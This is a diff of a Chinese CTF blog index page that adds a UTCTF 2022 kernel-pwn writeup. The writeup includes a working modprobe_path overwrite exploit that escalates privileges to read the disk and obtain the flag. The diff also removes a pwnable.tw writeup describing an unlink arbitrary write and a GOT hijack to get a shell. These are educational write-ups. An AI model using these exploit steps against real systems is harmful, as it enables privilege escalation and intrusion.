@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">20</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">23</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -136,7 +136,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">16</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">17</span></a>
 
   </li>
         <li class="menu-item menu-item-commonweal">
@@ -195,6 +195,117 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://avavaaya.github.io/2022/03/15/UTCTF-2022-bloat-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="AvavaAYA">
+      <meta itemprop="description" content="在看吗, 在看的话就给你一拳">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/15/UTCTF-2022-bloat-writeup/" class="post-title-link" itemprop="url">UTCTF-2022-bloat-writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-15 21:08:50 / 修改时间：21:09:31" itemprop="dateCreated datePublished" datetime="2022-03-15T21:08:50+08:00">2022-03-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-writeup/" itemprop="url" rel="index"><span itemprop="name">pwn-writeup</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <span id="more"></span>
+
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>按照惯例，先解压:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> rootfs</span><br><span class="line"><span class="built_in">cd</span> rootfs</span><br><span class="line"><span class="built_in">mv</span> ../rootfs.cpio.gz .</span><br><span class="line">gunzip ./rootfs.cpio.gz</span><br><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>
+
+<p>kernel-pwn题目的突破口往往出现在出题者拓展的kernel-object中:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[rootfs]$ find ./ -name *.ko</span><br><span class="line">./lib/modules/5.15.0/extra/bloat.ko</span><br></pre></td></tr></table></figure>
+
+<p>为了方便后面的调试，先把bzImage解压成elf，并解析出部分符号表:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf bzImage vmlinux.bin</span><br></pre></td></tr></table></figure>
+<p>在run.sh末尾加上-s与-S选项，进入gdb:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux.bin</span><br><span class="line">(gdb)&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure>
+<p>当然，也可以直接</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb -ex <span class="string">&#x27;set architecture i386:x86_64&#x27;</span> \</span><br><span class="line">-ex <span class="string">&#x27;target remote localhost:1234&#x27;</span> \</span><br><span class="line">-ex <span class="string">&#x27;add-symbol-file bloat.ko 0xffffffffc0000000&#x27;</span> \</span><br><span class="line">-ex <span class="string">&#x27;b load_bloat_binary&#x27;</span> \</span><br><span class="line">-ex <span class="string">&#x27;c&#x27;</span> ./vmlinux.bin</span><br></pre></td></tr></table></figure>
+<p>一步到位，把断点下在load_bloat_binary函数上.</p>
+<hr>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>将bloat.ko拿进ida中分析:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v1 = <span class="built_in">strrchr</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">0x60</span>), <span class="string">&#x27;.&#x27;</span>);<span class="comment">// 文件后缀名判断</span></span><br><span class="line"><span class="keyword">if</span> ( !v1 )</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0xFFFFFFF8</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v1, <span class="string">&quot;.bloat&quot;</span>) )</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0xFFFFFFF8</span>;</span><br><span class="line">v2 = <span class="built_in">generic_file_llseek</span>(*(_QWORD *)(a1 + <span class="number">0x40</span>), <span class="number">0LL</span>, <span class="number">2LL</span>);<span class="comment">// 判断文件大小</span></span><br><span class="line"><span class="built_in">generic_file_llseek</span>(*(_QWORD *)(a1 + <span class="number">0x40</span>), <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>
+<p>且根据a1是setup_new_exec等函数的参数，在:<br><a target="_blank" rel="noopener external nofollow noreferrer" href="https://elixir.bootlin.com/linux/v5.15/source/include/linux/binfmts.h#L17">elixir.bootlin.com</a>中进行检索，确定a1的结构体:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_binprm</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> __int64 vma_pages;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> __int64 p;</span><br><span class="line">	<span class="type">unsigned</span> __int64 argmin;</span><br><span class="line">	<span class="type">unsigned</span> __int32 have_execfd : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> __int32 execfd_creds : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> __int32 secureexec : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> __int32 point_of_no_return : <span class="number">1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">executable</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">interpreter</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span></span><br><span class="line">	<span class="type">int</span> unsafe;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> per_clear;</span><br><span class="line">	<span class="type">int</span> argc;</span><br><span class="line">	<span class="type">int</span> envc;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *filename;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *interp;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *fdpath;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> interp_flags;</span><br><span class="line">	<span class="type">int</span> execfd;</span><br><span class="line">	<span class="type">unsigned</span> __int64 loader;</span><br><span class="line">	<span class="type">unsigned</span> __int64 exec;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim_stack</span>;</span></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>确定结构体后，发现有这样一行:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm_mmap(<span class="number">0LL</span>, v6, <span class="number">256LL</span>, <span class="number">7LL</span>, <span class="number">18LL</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>
+<p>对于地址没有检查，造成了任意地址写，故考虑覆写modprobe_path.</p>
+<hr>
+<h2 id="exploition"><a href="#exploition" class="headerlink" title="exploition"></a>exploition</h2><h4 id="先将modprobe-path覆写为目标文件"><a href="#先将modprobe-path覆写为目标文件" class="headerlink" title="先将modprobe_path覆写为目标文件:"></a>先将modprobe_path覆写为目标文件:</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -ne <span class="string">&quot;\x80\x81\x03\x82\xff\xff\xff\xff/tmp/a&quot;</span> &gt; exp.bloat</span><br></pre></td></tr></table></figure>
+<h4 id="将目标操作写入a"><a href="#将目标操作写入a" class="headerlink" title="将目标操作写入a:"></a>将目标操作写入a:</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;#!/bin/sh\ncat /dev/sda &gt; /tmp/flag&quot;</span> &gt; /tmp/a</span><br></pre></td></tr></table></figure>
+<h4 id="触发调用modprobe-path"><a href="#触发调用modprobe-path" class="headerlink" title="触发调用modprobe_path:"></a>触发调用modprobe_path:</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> b</span><br><span class="line"><span class="built_in">chmod</span> +x b a exp.bloat</span><br><span class="line">/tmp/exp.bloat</span><br><span class="line">/tmp/b</span><br></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /tmp/flag</span><br><span class="line">utflag&#123;oops_forgot_to_use_put_user283558318&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/s &amp;modprobe_path</span><br><span class="line">0xffffffff82038180:     <span class="string">&quot;/tmp/a&quot;</span></span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -623,126 +734,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://avavaaya.github.io/2021/11/14/pwnable-tw-applestore-writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="AvavaAYA">
-      <meta itemprop="description" content="在看吗, 在看的话就给你一拳">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/14/pwnable-tw-applestore-writeup/" class="post-title-link" itemprop="url">pwnable-tw-applestore writeup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-14 16:22:06" itemprop="dateCreated datePublished" datetime="2021-11-14T16:22:06+08:00">2021-11-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-05 13:58:18" itemprop="dateModified" datetime="2022-03-05T13:58:18+08:00">2022-03-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn-writeup/" itemprop="url" rel="index"><span itemprop="name">pwn-writeup</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>5.7k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <span id="more"></span>
-
-<h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><ul>
-<li>ebp劫持</li>
-<li>双向链表unlink实现任意地址写</li>
-<li>\0截断</li>
-</ul>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>  菜单题，进入ida分析，先看创建节点以及插入节点的函数:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> **__cdecl <span class="title function_">create</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> **v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> **v3; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="type">char</span> **)<span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  v2[<span class="number">1</span>] = a2;</span><br><span class="line">  asprintf(v2, <span class="string">&quot;%s&quot;</span>, a1);</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">insert</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = &amp;myCart; i[<span class="number">2</span>]; i = (_DWORD *)i[<span class="number">2</span>] )</span><br><span class="line">    ;</span><br><span class="line"><span class="comment">//遍历找到当前链表中最后一个节点</span></span><br><span class="line">  i[<span class="number">2</span>] = a1;</span><br><span class="line"><span class="comment">//i.fd = a1;</span></span><br><span class="line">  result = a1;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">12</span>) = i;</span><br><span class="line"><span class="comment">//a1.bk = i;</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  可以看出myCart中是一个双向链表，结构如下:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span>&#123;</span></span><br><span class="line">	<span class="type">char</span>* itemName;</span><br><span class="line">	<span class="type">char</span>* itemPrice;</span><br><span class="line">	item* fd;</span><br><span class="line">	item* bk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  接下来寻找漏洞点，发现程序中使用my_read函数提供了类似read的功能，多次出现”只需要一个字节的地方read了0x15字节”的现象:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">my_read(&amp;buf, <span class="number">0x15</span>u);</span><br></pre></td></tr></table></figure>
-<p>  如cart函数:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cart</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v2; <span class="comment">// [esp+18h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-2Ch]</span></span><br><span class="line">  _DWORD *i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+26h] [ebp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  my_read(&amp;buf, <span class="number">0x15</span>u);</span><br><span class="line"><span class="comment">//为了程序正常运行，ebp-22h与ebp-21h的位置需要分别填入&#x27;y&#x27;与&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment">//栈中可以控制的地址范围为从 ebp-20h 开始 </span></span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">121</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;==== Cart ====&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = (_DWORD *)dword_804B070; i; i = (_DWORD *)i[<span class="number">2</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = v2++;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d: %s - $%d\n&quot;</span>, v0, *i, i[<span class="number">1</span>]);</span><br><span class="line">      v3 += i[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>  此外，还发现在checkout函数中存在条件判断:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">checkout</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = cart();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">7174</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;*: iPhone 8 - $1&quot;</span>);</span><br><span class="line">    asprintf(&amp;v2, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;iPhone 8&quot;</span>);</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">    insert(&amp;v2);</span><br><span class="line">    v1 = <span class="number">7175</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Total: $%d\n&quot;</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Want to checkout? Maybe next time!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  这里的v2作为一个新建节点储存在栈中地址从ebp-0x20开始，观察其他函数: 当程序在handler函数中运行到cart()，checkout()，delete()等函数时，ebp是相同的，这也意味着在其他函数中也有机会修改ebp-0x20位置附近的值，达到修改iPhone8节点中fd、bk指针值的目的，进而可以达到泄露libc、unlink任意地址写的目的;<br>  另一方面来理解，此处的新增节点只是一个局部变量，可是程序却可以在退出该函数，局部变量失效的情况下再次访问这个节点，甚至可以理解为栈中的”UAF”;<br>  回到delete的代码:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v1; <span class="comment">// [esp+10h] [ebp-38h]</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// [esp+14h] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+18h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> nptr; <span class="comment">// [esp+26h] [ebp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = <span class="number">1</span>;</span><br><span class="line">  v2 = (_DWORD *)dword_804B070;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Item Number&gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  my_read(&amp;nptr, <span class="number">0x15</span>u);</span><br><span class="line">  v3 = atoi(&amp;nptr);</span><br><span class="line">  <span class="keyword">while</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v2[<span class="number">2</span>];</span><br><span class="line">      v5 = v2[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">        *(_DWORD *)(v5 + <span class="number">8</span>) = v4;</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">        *(_DWORD *)(v4 + <span class="number">12</span>) = v5;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Remove %d:%s from your shopping cart.\n&quot;</span>, v1, *v2);</span><br><span class="line">      <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v7;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v1;</span><br><span class="line">    v2 = (_DWORD *)v2[<span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  看到unlink实现的代码，我们确实能修改某些地址上的内容，但是这个”某些地址”也是有条件的，倘若直接rop修改handler函数返回地址为system地址，那么delete函数会同时修改system函数中的内容，造成程序崩溃;<br>  综上，delete中的unlink不能以system函数为目标，故切换思路，寻找程序中读取输入的函数，劫持其参数，达到写入system函数地址到got表完成got hijacking的目的;<br>  观察handler函数的内容发现:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> nptr; <span class="comment">// [esp+16h] [ebp-22h]</span></span><br><span class="line">my_read(&amp;nptr, <span class="number">0x15</span>u);</span><br><span class="line"><span class="keyword">switch</span> ( atoi(&amp;nptr) )</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>
-<p>  nptr, 即ebp-22h的地方可以利用，可以将handler函数的ebp劫持到got表atoi-22h的地方，nptr与atoi函数地址重叠，再读入system_addr 与 “;sh\x00”到该位置即可getshell;</p>
-<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>  首先通过简单的计算构建出能生成iPhone8节点的输入:</p>
